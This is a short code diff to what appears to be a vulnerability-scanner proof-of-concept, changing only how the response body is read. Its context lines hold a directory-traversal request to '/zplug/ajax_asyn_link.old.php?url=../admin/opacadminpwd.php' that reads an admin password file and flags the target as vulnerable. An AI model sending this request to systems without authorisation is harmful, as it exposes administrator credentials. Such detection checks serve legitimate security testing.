@@ -50,7 +50,7 @@ class Poc(ABPoc):
             verify_url = ('%s/zplug/ajax_asyn_link.old.php?url='
                           '../admin/opacadminpwd.php') % url
             req = requests.get(verify_url)
-            if req.status_code == 200 and '$strPassWdView' in req.content:
+            if req.status_code == 200 and '$strPassWdView' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
